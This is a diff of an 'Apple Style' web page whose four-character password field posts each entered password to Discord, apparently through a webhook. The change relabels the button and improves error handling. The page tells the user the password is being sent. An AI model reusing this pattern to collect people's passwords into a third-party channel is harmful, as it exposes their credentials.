@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apple Style Input Bar with Send Button</title>
+    <title>Apple Style Input Bar with Enter Button</title>
     <style>
         * {
             margin: 0;
@@ -108,7 +108,7 @@
 
         <div class="input-container">
             <input type="password" class="input-bar" id="inputBar" maxlength="4" placeholder="Enter password" />
-            <button class="send-btn" id="sendButton">Send</button>
+            <button class="send-btn" id="sendButton">Enter</button>
         </div>
     </div>
 
@@ -146,14 +146,19 @@
                     },
                     body: JSON.stringify(payload),
                 })
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) {
+                        return Promise.reject('Failed to send message');
+                    }
+                    return response.json();
+                })
                 .then(data => {
                     alert('Password sent to Discord!');
                     inputBar.value = '';
                 })
                 .catch(error => {
-                    alert('Error sending message to Discord');
                     console.error('Error:', error);
+                    alert(`Error sending to Discord: ${error}`);
                 });
             } else {
                 alert('Please enter a 4-character password.');
